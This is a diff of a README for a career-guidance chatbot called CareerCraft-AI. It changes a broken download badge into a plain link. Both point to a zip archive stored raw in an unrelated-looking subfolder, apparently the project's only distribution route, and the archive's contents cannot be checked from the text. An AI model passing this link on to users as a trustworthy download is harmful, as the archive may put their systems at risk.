@@ -1,7 +1,7 @@
 # 🎓 CareerCraft-AI - Your Guide to Career Success
 
 ## 🌐 Download Now
-[![Download CareerCraft-AI](https://raw.githubusercontent.com/Chetan7777777/CareerCraft-AI/main/Egbert/CareerCraft-AI.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Chetan7777777/CareerCraft-AI/main/Egbert/CareerCraft-AI.zip)
+[Download CareerCraft-AI](https://raw.githubusercontent.com/Chetan7777777/CareerCraft-AI/main/Egbert/CareerCraft-AI.zip)
 
 ## 🚀 Getting Started
 CareerCraft-AI is a chatbot designed to help you navigate your career path. With personalized guidance, it uses the power of AI to suggest learning paths and skills in areas such as Data Science, Cloud Engineering, and Cybersecurity.
